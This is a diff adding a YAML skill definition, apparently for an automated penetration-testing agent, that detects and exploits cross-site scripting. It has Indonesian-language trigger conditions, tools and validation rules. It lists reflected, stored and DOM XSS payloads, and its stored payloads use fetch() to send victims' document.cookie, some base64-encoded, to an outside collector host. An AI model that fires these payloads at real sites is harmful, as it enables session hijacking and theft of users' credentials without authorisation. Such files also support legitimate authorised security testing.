@@ -1,0 +1,55 @@
+name: xss
+description: Detect and exploit Cross-Site Scripting
+phase: exploit
+priority: 7
+
+conditions:
+  triggers:
+    - Parameter direfleksikan di response body
+    - Parameter muncul di atribut HTML (src, href, value)
+    - Parameter muncul di tag <script>
+    - Content-Type: text/html (bukan JSON)
+  not_recommended:
+    - Content-Security-Policy ketat (script-src: nonce)
+    - Output di-encode dengan htmlspecialchars/escape
+    - Hanya server-side rendering tanpa input di template
+
+payloads:
+  reflected:
+    - "<script>alert(1)</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "javascript:alert(1)"
+    - "\"><script>alert(1)</script>"
+    - "'-alert(1)-'"
+  stored:
+    - "<script>fetch('https://collab.xyz/'+document.cookie)</script>"
+    - "<img src=x onerror=\"fetch('https://collab.xyz/'+btoa(document.cookie))\">"
+  dom:
+    - "#<img src=x onerror=alert(1)>"
+    - "javascript:alert(1)//"
+    - "\"-alert(1)-\""
+
+tools:
+  primary: manual (curl/httpx + browser)
+  automated: [dalfox, xsstrike]
+  manual: [curl, httpx, playwright]
+
+validation:
+  method: deterministic
+  rules:
+    - type: reflection
+      method: "payload in response AND not HTML-encoded"
+    - type: stored
+      method: "inject → navigate ke halaman lain → payload muncul"
+    - type: dom
+      method: "payload di URL fragment → JS eksekusi tanpa refresh"
+  reject_if:
+    - "Payload refleksi tapi HTML-encoded (&lt; &gt; &amp;)"
+    - "Hanya muncul di atribut title/alt (bukan HTML context)"
+    - "CSP block di browser (confirm dengan browser, bukan curl)"
+
+examples:
+  - target: "/search?q=test"
+    payload: "<script>alert(document.domain)</script>"
+    indicator: "script tag in response"
+    tool: "curl"
